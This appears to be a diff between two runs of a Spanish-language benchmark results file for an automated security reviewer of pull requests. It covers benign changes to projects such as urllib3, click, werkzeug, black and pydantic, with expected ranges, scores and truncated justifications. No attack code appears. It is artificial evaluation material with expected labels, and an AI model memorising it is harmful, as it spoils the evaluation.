+    "justificacion": "Los cambios en el workflow de GitHub Actions añaden una dependencia de build estándar y una comprobación de tamaño del paquete para evitar bloat, lo que es una medida de calidad y seguridad. La modificación en pyproject."
   },
   {
     "caso": "real_urllib3_urllib3_5104",
@@ -613,7 +613,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de una action de terceros ('actions/cache') pinneada por SHA de commit completo, sin añadir nuevos pasos, permisos o acceso a secretos, y la eliminación de un fichero .gitkeep es un cambio "
+    "justificacion": "El cambio consiste en una actualización rutinaria de la acción oficial 'actions/cache' de v5.0.1 a v6.1.0, pinneada por un SHA de commit específico, sin añadir nuevos pasos, permisos o acceso a secretos en el workflow de"
   },
   {
     "caso": "real_urllib3_urllib3_5105",
@@ -624,7 +624,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de la acción `actions/setup-python` de `v6.2.0` a `v6.3.0` en varios workflows de GitHub Actions, pinneada por SHA de commit completo (no un tag mutable), sin añadir pasos nuevos, modificar"
+    "justificacion": "Es una actualización rutinaria de la acción de GitHub 'actions/setup-python' de la v6.2.0 a la v6.3.0 en varios workflows, pinneada por SHA de commit completo (no un tag mutable) y sin adición de pasos, permisos o acceso"
   },
   {
     "caso": "real_urllib3_urllib3_5116",
@@ -635,7 +635,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los workflows de GitHub Actions se actualizan para usar una versión más reciente de una acción de terceros, pero siguen pinneados por el SHA de commit completo (no un tag mutable) y no se añaden pasos nuevos, permisos ni"
+    "justificacion": "Es una actualización rutinaria de una GitHub Action de terceros, pinneada por SHA de commit completo (no un tag mutable) en los tres workflows, sin pasos, permisos ni acceso a secrets añadidos, y la eliminación de .gitke"
   },
   {
     "caso": "real_urllib3_urllib3_5127",
@@ -646,7 +646,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de una acción de terceros (CodeQL), pinneada por SHA de commit completo (no un tag mutable) en el workflow, sin pasos, permisos ni acceso a secrets añadidos -- el mismo patrón de pin seguro"
+    "justificacion": "Es una actualización rutinaria de la acción oficial 'github/codeql-action', pinneada por SHA de commit completo (no un tag mutable) en los tres pasos, sin adición de pasos, permisos o acceso a secretos, y se elimina un f"
   },
   {
     "caso": "real_urllib3_urllib3_5130",
@@ -657,7 +657,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de una action de terceros ('actions/setup-node') a una nueva versión mayor, pinneada por SHA de commit completo (no un tag mutable), sin pasos nuevos, permisos ni acceso a secrets añadidos."
+    "justificacion": "Es una actualización rutinaria de la acción oficial 'actions/setup-node' a una nueva versión mayor (v7.0.0), pinneada por SHA de commit completo, sin añadir nuevos pasos, permisos o acceso a secrets en el workflow."
   },
   {
     "caso": "real_urllib3_urllib3_5135",
@@ -668,7 +668,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de la acción 'actions/setup-python' pinneada por el SHA de commit completo de la nueva versión (no un tag mutable) en múltiples workflows, sin añadir pasos nuevos, tocar permisos o secretos"
+    "justificacion": "Es una actualización rutinaria de la GitHub Action 'actions/setup-python' de v6.3.0 a v7.0.0 en varios workflows, pinneada por SHA de commit completo (no un tag mutable) y sin añadir pasos, permisos ni acceso a secrets. "
   },
   {
     "caso": "real_urllib3_urllib3_5142",
@@ -679,7 +679,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de la versión de una GitHub Action (`astral-sh/setup-uv`) en tres workflows, manteniendo el pin por SHA de commit completo (no un tag mutable) y sin añadir pasos, permisos ni acceso a secre"
+    "justificacion": "El cambio consiste en una actualización rutinaria de la acción de GitHub 'astral-sh/setup-uv' a una nueva versión (v9.0.0), pinneada por su SHA de commit completo, sin añadir nuevos pasos, modificar el acceso a secretos "
   },
   {
     "caso": "real_Textualize_rich_4006",
@@ -690,7 +690,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio corrige un bucle infinito en la función `split_graphemes` al mejorar el manejo de caracteres especiales de ancho cero como Zero Width Joiners (`\\u200d`) y Variation Selectors (`\\ufe0f`), e introduce tests unita"
+    "justificacion": "El cambio corrige un bucle infinito en el manejo de caracteres Unicode de ancho cero y caracteres especiales dentro de la función `split_graphemes`, añadiendo lógica más robusta y tests específicos para validar el compor"
   },
   {
     "caso": "real_Textualize_rich_4076",
@@ -701,7 +701,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio corrige un bug conocido en `Text.from_ansi` relacionado con la manipulación de saltos de línea, añadiendo un caso de prueba explícito que valida el nuevo comportamiento en `tests/test_ansi.py` y modificando la "
+    "justificacion": "El cambio central es una corrección de un bug en la forma en que el decodificador ANSI procesa las nuevas líneas, como se indica en el CHANGELOG y se valida con nuevos tests que verifican la preservación de los saltos de"
   },
   {
     "caso": "real_Textualize_rich_4077",
@@ -712,7 +712,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en añadir el método `isatty` a `FileProxy` para delegar la llamada al objeto de fichero subyacente, junto con un test de regresión que verifica el comportamiento esperado; esto se alinea con una correc"
+    "justificacion": "El cambio consiste en añadir el método `isatty()` a la clase `FileProxy` para que propague la llamada a un objeto interno, y un test de regresión que verifica este comportamiento, lo cual es una corrección de bug legítim"
   },
   {
     "caso": "real_Textualize_rich_4079",
@@ -723,7 +723,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio refactoriza el manejo de texto en el renderizador de Markdown para corregir un error de formato en celdas de tabla con código inline, e incluye un nuevo test de regresión para verificar la corrección del fix."
+    "justificacion": "El cambio corrige un bug en el renderizado de código inline en tablas de Markdown (`rich/markdown.py`), añade un test de regresión específico (`tests/test_markdown.py`) y actualiza el changelog, sin introducir nueva lógi"
   },
   {
     "caso": "real_encode_httpx_3670",
@@ -734,7 +734,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios refactorizan la gestión de flujos de archivos para pasar un objeto de archivo ya abierto al constructor de FileStream, en lugar de que FileStream lo abra internamente, lo cual es un cambio de diseño válido si"
+    "justificacion": "El cambio refactoriza la clase FileStream para que reciba un objeto de archivo ya abierto, en lugar de abrirlo ella misma, lo que implica mover la llamada a 'open(self._path, 'rb')' a los puntos de creación de la secuenc"
   },
   {
     "caso": "real_encode_httpx_3690",
@@ -745,7 +745,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios introducen un mecanismo `wait_ready` para manejar la llegada de datos de forma más robusta en los parsers y servidores HTTP, lo que mejora la gestión del I/O sin introducir lógica maliciosa."
+    "justificacion": "Los cambios introducen una nueva funcionalidad `wait_ready` y la utilizan en el bucle de manejo de solicitudes del servidor para gestionar la disponibilidad de datos en el stream, lo cual es una mejora funcional de la ló"
   },
   {
     "caso": "real_pallets_click_3653",
@@ -756,7 +756,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio corrige un error de renderizado de texto en la terminal (los prompts de confirm y prompt no eliminaban los códigos ANSI de color en streams sin soporte), añadiendo una comprobación de compatibilidad con ANSI y "
+    "justificacion": "El cambio introduce una lógica para limpiar los códigos ANSI de color de los prompts de 'confirm()' y 'prompt()' cuando el stream de salida no los soporta, corrigiendo un bug previamente reportado, y se añade un test par"
   },
   {
     "caso": "real_pallets_click_3656",
@@ -767,7 +767,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios consisten en una actualización de la documentación para reflejar una corrección de los tests y una modificación en los mismos para ser compatibles con pytest >= 9.1, reemplazando `itertools.chain` por un unpa"
+    "justificacion": "El cambio consiste en la eliminación de un fichero .gitkeep, la actualización de una entrada en el CHANGELOG y una refactorización de la forma en que se generan los parámetros para un test de pytest, eliminando itertools"
   },
   {
     "caso": "real_pallets_click_3671",
@@ -778,7 +778,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios se limitan a ajustes textuales en la documentación y docstrings, generalizando la descripción del manejo de colores ANSI y eliminando referencias explícitas a Windows sin alterar la lógica de la aplicación ni"
+    "justificacion": "Los cambios consisten en la eliminación de un fichero .gitkeep, y modificaciones menores en la documentación y comentarios que simplifican o generalizan descripciones sobre el manejo de colores ANSI en Windows, sin alter"
   },
   {
     "caso": "real_pallets_click_3677",
@@ -789,7 +789,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una mejora de la validación de argumentos de color y la corrección de un bug donde el índice de color 0 era ignorado, acompañado de nuevos tests y una actualización del registro de cambios."
+    "justificacion": "El cambio corrige un bug en `style()` que ignoraba el índice de color 0 (negro) debido a una comprobación de verdad (`if fg:`), reemplazándola por `if fg is not None:`, y añade validación explícita para los argumentos de"
   },
   {
     "caso": "real_pallets_click_3678",
@@ -800,18 +800,18 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio reestructura cómo Click maneja la opción de ayuda automática, usando un nombre de almacenamiento interno reservado (_click_default_help) para evitar conflictos con parámetros de usuario llamados 'help', e intro"
+    "justificacion": "El cambio principal introduce un nombre de almacenamiento reservado '_click_default_help' para la opción de ayuda automática, evitando colisiones con parámetros de usuario y añadiendo advertencias explícitas sobre colisi"
   },
   {
     "caso": "real_pallets_click_3681",
     "clase": "benign",
     "dificultad": "medium",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (4)",
-    "score": 4,
+    "obtenido": "verde (7)",
+    "score": 7,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una mejora defensiva del regex que procesa las secuencias de escape ANSI en `src/click/_compat.py`, haciéndolo más robusto al validar la gramática completa de las secuencias CSI, con nuevos y extens"
+    "justificacion": "El cambio principal amplía el regex `_ansi_re` en `src/click/_compat.py` para cubrir la gramática completa de las secuencias de escape CSI (ECMA-48), asegurando que una gama más amplia de códigos de terminal (incluyendo "
   },
   {
     "caso": "real_pallets_flask_5899",
@@ -822,7 +822,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en la deprecación y futura eliminación del método `should_ignore_error`, añadiendo una advertencia en tiempo de ejecución y actualizando las referencias para manejar su ausencia, lo que es un refactori"
+    "justificacion": "El cambio consiste en la deprecación documentada de una función (should_ignore_error) con la adición de advertencias de ejecución y la eliminación de su implementación, sin introducir nuevas llamadas externas, ofuscación"
   },
   {
     "caso": "real_pallets_flask_5903",
@@ -833,7 +833,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio simplifica la creación de directorios usando el argumento `exist_ok=True` de `os.makedirs`, lo que es funcionalmente equivalente al bloque `try-except` anterior, sin introducir nuevas dependencias, llamadas de "
+    "justificacion": "El cambio reemplaza un bloque try/except para la creación de directorios con la forma idiomática y segura de os.makedirs(..., exist_ok=True), sin introducir nuevas dependencias, llamadas de red, o cambios en el comportam"
   },
   {
     "caso": "real_pallets_flask_6013",
@@ -844,7 +844,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio adapta la lógica de autoescapado de Jinja para que la comparación de extensiones de archivo sea insensible a mayúsculas y minúsculas, lo cual es una mejora funcional coherente con las actualizaciones de la docu"
+    "justificacion": "La modificación cambia la lógica de autoescape de Jinja para usar una comparación insensible a mayúsculas y minúsculas en las extensiones de archivo, corrigiendo el comportamiento para casos como '.HTML' en lugar de solo"
   },
   {
     "caso": "real_pallets_jinja_2062",
@@ -855,7 +855,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una mejora de la función `urlize` para evitar que añada `mailto:` a valores que empiezan por `@` (como los nombres de usuario de Mastodon), acompañado de un nuevo test que verifica este comportamien"
+    "justificacion": "El cambio consiste en una corrección funcional en la función `urlize` para evitar que añada `mailto:` a valores que no son correos electrónicos (como `@a@b`), con una nueva línea de código en `src/jinja2/utils.py` y un n"
   },
   {
     "caso": "real_pallets_jinja_2066",
@@ -866,7 +866,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en la actualización del número de versión de '3.1.5.dev' a '3.1.5' en el fichero __init__.py y la correspondiente actualización de la fecha de publicación en CHANGES.rst, sin introducir código nuevo, d"
+    "justificacion": "El cambio consiste en una actualización rutinaria del número de versión de desarrollo a una versión estable y la fecha de lanzamiento en el CHANGELOG, sin introducir código nuevo, dependencias externas ni configuraciones"
   },
   {
     "caso": "real_pallets_jinja_2077",
@@ -877,18 +877,18 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una actualización de la cadena de versión de desarrollo a estable (__version__ = \"3.1.6.dev\" a \"3.1.6\") y la correspondiente actualización de la fecha de release en el changelog, sin añadir código e"
+    "justificacion": "El cambio de código consiste en actualizar la versión del paquete de '3.1.6.dev' a '3.1.6' y cambiar el estado de la versión a 'Released' en el archivo CHANGELOG, lo que es una actualización rutinaria para una nueva rele"
   },
   {
     "caso": "real_pallets_jinja_2099",
     "clase": "benign",
     "dificultad": "medium",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (7)",
-    "score": 7,
+    "obtenido": "verde (4)",
+    "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una actualización de un patrón de expresión regular en un fichero generado, junto con una pequeña modificación al script que lo genera para incluir la versión de Python, lo cual es consistente con u"
+    "justificacion": "El cambio actualiza el patrón de expresiones regulares para identificadores en Jinja2 y el script que lo genera; estos cambios son consistentes con una actualización del conjunto de caracteres Unicode soportados y no int"
   },
   {
     "caso": "real_pallets_werkzeug_3161",
@@ -899,7 +899,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en la deprecación y refactorización de la clase `CharsetAccept` y la propiedad `request.accept_charsets`, con la adición de `DeprecationWarning`s y el uso de `__getattr__` para la retrocompatibilidad, "
+    "justificacion": "El diff implementa de forma consistente una deprecación limpia de la clase `CharsetAccept` y la propiedad `accept_charsets`, renombrando la clase internamente y usando `__getattr__` para emitir `DeprecationWarning` sin i"
   },
   {
     "caso": "real_pallets_werkzeug_3163",
@@ -910,7 +910,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio en `IfRange.from_header` en `src/werkzeug/datastructures/range.py` corrige el comportamiento para descartar ETags débiles en el encabezado `If-Range`, lo cual se alinea con la especificación HTTP (RFC 7233), y "
+    "justificacion": "El cambio corrige el análisis del encabezado 'If-Range' para descartar correctamente los ETags débiles, en lugar de tratarlos como fuertes, lo cual es una mejora de seguridad y cumplimiento del RFC, reflejado en el `IfRa"
   },
   {
     "caso": "real_pallets_werkzeug_3164",
@@ -921,7 +921,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio actualiza el algoritmo de hashing de SHA-1 a SHA3-256 para la generación de ETags y el pin del depurador, lo cual es una mejora de seguridad criptográfica estándar, sin introducir nueva lógica maliciosa."
+    "justificacion": "El cambio consiste en actualizar el algoritmo de hashing de SHA-1 a SHA3-256 en varias partes del código y en los tests, citando compatibilidad con FIPS 140, lo cual es una mejora de seguridad legítima sin añadir funcion"
   },
   {
     "caso": "real_pallets_werkzeug_3166",
@@ -932,7 +932,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio modifica la generación de ETag para usar codificación base64 en lugar de hexadecimal, lo cual es un cambio funcional y no introduce nuevas dependencias externas, descargas de código, exfiltración de datos ni of"
+    "justificacion": "El cambio consiste en modificar la codificación del ETag de hexadecimal a base64, manteniendo el mismo algoritmo de hashing (SHA3-256) y actualizando las pruebas para reflejar el nuevo formato."
   },
   {
     "caso": "real_pallets_werkzeug_3168",
@@ -943,10 +943,21 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "La refactorización de `_plain_int` para aceptar una base y una expresión regular más permisiva para manejar hexadecimales, junto con su adopción en puntos de análisis de encabezados HTTP, es una mejora funcional con prue"
+    "justificacion": "El cambio refactoriza la función interna `_plain_int` para permitir parsing con diferentes bases (decimal y hexadecimal), y se aplica en los lugares correspondientes (p.ej. chunk lengths en `serving.py` que son hexadecim"
   },
   {
     "caso": "real_pallets_werkzeug_3215",
+    "clase": "benign",
+    "dificultad": "medium",
+    "esperado": "verde/amarillo (min. 0)",
+    "obtenido": "verde (4)",
+    "score": 4,
+    "cumple": "OK",
+    "categoria": "ninguna",
+    "justificacion": "El cambio en `src/werkzeug/routing/map.py` es una refactorización de la lógica condicional que corrige un error en la evaluación de rutas, haciendo que el código sea consistente con el comentario. Se añaden tests unitari"
+  },
+  {
+    "caso": "real_pallets_werkzeug_3216",
     "clase": "benign",
     "dificultad": "medium",
     "esperado": "verde/amarillo (min. 0)",
@@ -954,18 +965,7 @@
     "score": 7,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "La modificación refactoriza una condición lógica en el enrutamiento de Werkzeug que afecta cómo se construyen las URLs, cambiando cuándo se devuelve una ruta 'plain'. Este cambio funcional se valida con la adición de dos"
-  },
-  {
-    "caso": "real_pallets_werkzeug_3216",
-    "clase": "benign",
-    "dificultad": "medium",
-    "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (22)",
-    "score": 22,
-    "cumple": "OK",
-    "categoria": "ninguna",
-    "justificacion": "Se añade una nueva importación condicional de 'profiling.tracing.Profile' para Python 3.15+, introduciendo una dependencia externa potencialmente nueva sin que el diff provea contexto sobre su origen o reputación, aunque"
+    "justificacion": "El cambio introduce un import condicional de `profiling.tracing.Profile` para Python 3.15 y versiones futuras, lo cual se documenta explícitamente en el `CHANGES.rst`. Es una adaptación para compatibilidad futura con una"
   },
   {
     "caso": "real_pallets_werkzeug_3218",
@@ -976,7 +976,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio adapta el análisis de URIs/IRIs para preservar usuarios, contraseñas y puertos vacíos o con valor 0, reemplazando comprobaciones de verdad implícitas con 'is not None' para asegurar que estos valores sean trata"
+    "justificacion": "El cambio adapta las comprobaciones de componentes de la URI (puerto, usuario, contraseña) de un implícito 'if valor' a un explícito 'if valor is not None', para preservar valores válidos como cadenas vacías o puerto 0 q"
   },
   {
     "caso": "real_pallets_werkzeug_3219",
@@ -987,21 +987,10 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio introduce un nuevo método `query` en la clase `TestClient` para el método HTTP `QUERY`, con la correspondiente entrada en el `CHANGES.rst` y una pequeña refactorización de un docstring. No hay indicios de códig"
+    "justificacion": "El cambio introduce un nuevo método `query` en el `TestClient` que llama a `self.open` con el método HTTP 'QUERY', y actualiza la documentación para reflejar este cambio, sin introducir código malicioso, llamadas externa"
   },
   {
     "caso": "real_psf_black_5280",
-    "clase": "benign",
-    "dificultad": "medium",
-    "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (1)",
-    "score": 1,
-    "cumple": "OK",
-    "categoria": "ninguna",
-    "justificacion": "El cambio se limita a una refactorización de texto en un comentario, sin afectar ninguna línea de código ejecutable, dependencia o configuración de build."
-  },
-  {
-    "caso": "real_psf_black_5281",
     "clase": "benign",
     "dificultad": "medium",
     "esperado": "verde/amarillo (min. 0)",
@@ -1009,7 +998,18 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en la eliminación de un fichero .gitkeep_base (generalmente vacío y sin impacto funcional) y la corrección de una errata en un comentario en src/black/nodes.py, sin afectar la lógica del código."
+    "justificacion": "El cambio consiste únicamente en correcciones tipográficas o de estilo en los comentarios/docstrings de un fichero de código existente, sin afectar ninguna línea ejecutable, dependencia o script de build."
+  },
+  {
+    "caso": "real_psf_black_5281",
+    "clase": "benign",
+    "dificultad": "medium",
+    "esperado": "verde/amarillo (min. 0)",
+    "obtenido": "verde (1)",
+    "score": 1,
+    "cumple": "OK",
+    "categoria": "ninguna",
+    "justificacion": "El cambio se limita a una corrección tipográfica menor (añadir un espacio) en un comentario o docstring, sin impacto en la lógica o el comportamiento del código."
   },
   {
     "caso": "real_psf_black_5282",
@@ -1020,7 +1020,7 @@
     "score": 1,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una corrección tipográfica menor ('an lambda' por 'a lambda') en una cadena de documentación o comentario, sin afectar ninguna lógica ejecutable, dependencia o script de build."
+    "justificacion": "El cambio consiste en una corrección tipográfica menor ('an lambda' a 'a lambda') en un comentario o cadena de documentación, sin afectar la lógica del código, dependencias o configuración."
   },
   {
     "caso": "real_psf_black_5283",
@@ -1031,7 +1031,7 @@
     "score": 1,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste únicamente en corregir una errata ('a the' por 'the') dentro de un comentario de código, sin afectar a la lógica ejecutable, dependencias o configuración del proyecto."
+    "justificacion": "El cambio consiste en la eliminación de un fichero .gitkeep_base sin contenido funcional y la corrección de una errata ('a the current state' por 'the current state') dentro de un comentario de código, sin ningún impacto"
   },
   {
     "caso": "real_psf_black_5287",
@@ -1042,7 +1042,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una corrección de un bug en el manejador de 't-strings' como docstrings en el parser, incluyendo una actualización de la condición en `src/black/nodes.py` y un nuevo fichero de test que verifica el "
+    "justificacion": "El cambio consiste en una corrección de un linter/formatter para no tratar las 't-strings' como docstrings, incluyendo una entrada en el CHANGELOG, la lógica de exclusión en `src/black/nodes.py` (línea 8) y un nuevo test"
   },
   {
     "caso": "real_psf_black_5294",
@@ -1053,7 +1053,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios consisten en correcciones de errores tipográficos, mejoras de redacción en comentarios y docstrings, la eliminación de una entrada duplicada y la supresión de una constante aparentemente sin usar, sin impacto"
+    "justificacion": "El diff consiste en correcciones tipográficas en comentarios y docstrings, la eliminación de una línea duplicada, la eliminación de una constante aparentemente no utilizada y la eliminación de un archivo '.gitkeep_base' "
   },
   {
     "caso": "real_psf_requests_7551",
@@ -1064,7 +1064,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una actualización rutinaria de la versión de un hook de pre-commit (ruff-pre-commit de v0.15.17 a v0.15.18) y la eliminación de un fichero .gitkeep, sin añadir nueva lógica ni modificar permisos o c"
+    "justificacion": "El cambio es una actualización rutinaria de la versión del hook 'ruff-pre-commit' de v0.15.17 a v0.15.18 en la configuración de pre-commit, sin añadir lógica nueva ni modificar el comportamiento del hook existente más al"
   },
   {
     "caso": "real_psf_requests_7562",
@@ -1075,7 +1075,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en la eliminación de un archivo '.gitkeep_base', que es un marcador de directorio, y una actualización de versión menor (v0.15.18 a v0.15.20) para el hook 'ruff-pre-commit', un linter/formatter conocid"
+    "justificacion": "Se trata de una actualización rutinaria de la versión de un hook de pre-commit de 'ruff' de v0.15.18 a v0.15.20, sin añadir ni modificar ninguna otra lógica o configuración."
   },
   {
     "caso": "real_psf_requests_7590",
@@ -1086,7 +1086,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una actualización rutinaria de la versión del hook 'ruff-pre-commit' en la configuración de pre-commit, pasando de v0.15.20 a v0.15.21, sin añadir nueva lógica ni llamadas externas."
+    "justificacion": "El cambio consiste en la eliminación de un archivo '.gitkeep' y la actualización de la versión de 'ruff-pre-commit' de v0.15.20 a v0.15.21, lo cual es una actualización rutinaria sin impacto aparente en la seguridad."
   },
   {
     "caso": "real_psf_requests_7597",
@@ -1097,7 +1097,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una actualización rutinaria de la versión del hook `ruff-pre-commit` de `v0.15.21` a `v0.15.22` en la configuración de pre-commit, sin añadir nuevos hooks ni modificar el comportamiento de los exist"
+    "justificacion": "El cambio consiste en una actualización rutinaria de la versión de 'ruff-pre-commit' en la configuración de pre-commit, sin introducir código nuevo, cambios de lógica, ni acceso a recursos sensibles."
   },
   {
     "caso": "real_psf_requests_7598",
@@ -1108,7 +1108,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una actualización rutinaria de la versión de un hook de pre-commit ('ruff-pre-commit') de v0.15.22 a v0.16.0, sin añadir nueva lógica, comandos ni cambios de comportamiento más allá de la herramient"
+    "justificacion": "Es una actualización rutinaria de versión para la herramienta de linting 'ruff' en la configuración de pre-commit, sin añadir nuevos hooks, permisos o cambios de comportamiento más allá de la actualización."
   },
   {
     "caso": "real_pydantic_pydantic_13575",
@@ -1119,18 +1119,18 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio se limita a modificar el valor por defecto de `str_min_length` de `None` a `0` en un docstring, sin afectar la lógica de ejecución del código ni añadir dependencias o llamadas externas."
+    "justificacion": "El cambio se limita a modificar el texto de la documentación para el valor por defecto de 'str_min_length' de `None` a `0`, sin afectar la lógica del código ni el comportamiento del programa."
   },
   {
     "caso": "real_pydantic_pydantic_13577",
     "clase": "benign",
     "dificultad": "medium",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (4)",
-    "score": 4,
+    "obtenido": "amarillo (44)",
+    "score": 44,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Los cambios se limitan a un fichero .gitkeep (de función trivial) y un fichero lock de dependencias donde el análisis estático no detectó patrones maliciosos, lo que sugiere una actualización rutinaria de dependencias si"
+    "justificacion": "No se ha proporcionado ningún cambio de código real (diff) para analizar; solo se mencionan nombres de ficheros sin su contenido. [Ajustado a 60: hay contenido del diff que no se pudo revisar (truncado por tamaño) y no s"
   },
   {
     "caso": "real_pydantic_pydantic_13578",
@@ -1141,7 +1141,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Es una actualización rutinaria de la versión de una dependencia ('cryptography' de 48.0.1 a 50.0.0) en un fichero de lock, incluyendo nuevos hashes para verificar la integridad de las nuevas versiones, y no se han encont"
+    "justificacion": "Es una actualización rutinaria de la dependencia 'cryptography' en un lockfile (uv.lock), con los hashes y URLs actualizados correspondientemente y sin ninguna vulnerabilidad conocida para la nueva versión."
   },
   {
     "caso": "real_pydantic_pydantic_13584",
@@ -1152,18 +1152,18 @@
     "score": 7,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio introduce un bloque try-except para intentar obtener raw_annotations con Format.VALUE primero, y si falla, recurre a Format.FORWARDREF, lo que parece una refactorización de manejo de excepciones o optimización "
+    "justificacion": "El cambio introduce un bloque try-except para intentar una optimización de rendimiento al obtener anotaciones (Format.VALUE) y revertir a un formato más costoso (Format.FORWARDREF) en caso de error, sin añadir funcionali"
   },
   {
     "caso": "real_pydantic_pydantic_13586",
     "clase": "benign",
     "dificultad": "medium",
     "esperado": "verde/amarillo (min. 0)",
-    "obtenido": "verde (4)",
-    "score": 4,
+    "obtenido": "verde (7)",
+    "score": 7,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio asigna una referencia a un tipo (`types.AllowInfNan`) en lugar de `None` en la configuración de un campo, lo cual parece una corrección de tipo o refactorización rutinaria dentro de un fichero de código fuente,"
+    "justificacion": "El cambio sustituye un valor 'None' por una referencia de tipo 'types.AllowInfNan' en la configuración de un campo, lo que parece ser una refactorización interna o mejora del sistema de tipos de Pydantic, sin introducir "
   },
   {
     "caso": "real_pytest-dev_pytest_14702",
@@ -1174,7 +1174,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en un bugfix para una versión específica de Python (3.12) relacionado con doctests en funciones decoradas con fixtures, incluyendo la adición de un test que verifica la corrección del problema. No hay "
+    "justificacion": "El cambio consiste en un bugfix para Python 3.12 que modifica el comportamiento interno del módulo doctest para manejar correctamente las funciones decoradas como fixtures, y se complementa con un nuevo test que valida e"
   },
   {
     "caso": "real_pytest-dev_pytest_14832",
@@ -1185,7 +1185,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en una actualización rutinaria de versión de dos hooks de pre-commit, sin añadir nueva lógica, cambiar permisos o tocar la configuración de secretos."
+    "justificacion": "El cambio consiste en una actualización rutinaria de las versiones de dos hooks de pre-commit (ruff y zizmor), sin añadir nuevos hooks, cambiar argumentos, ni introducir lógica ejecutada en el runtime o CI/CD."
   },
   {
     "caso": "real_tqdm_tqdm_1768",
@@ -1196,7 +1196,7 @@
     "score": 4,
     "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "El cambio añade un caso de test para `tqdm.write()` cuando `sys.stdout` es `None`, y el código de producción añade un check `if fp is None: return` para evitar un crash en ese escenario, lo cual es una corrección de bug "
+    "justificacion": "El cambio añade un nuevo test para el caso en que `sys.stdout` sea `None` y modifica la función `tqdm.write` y su contexto `external_write_mode` para manejar este caso, evitando posibles errores -- es una mejora de robus"
   },
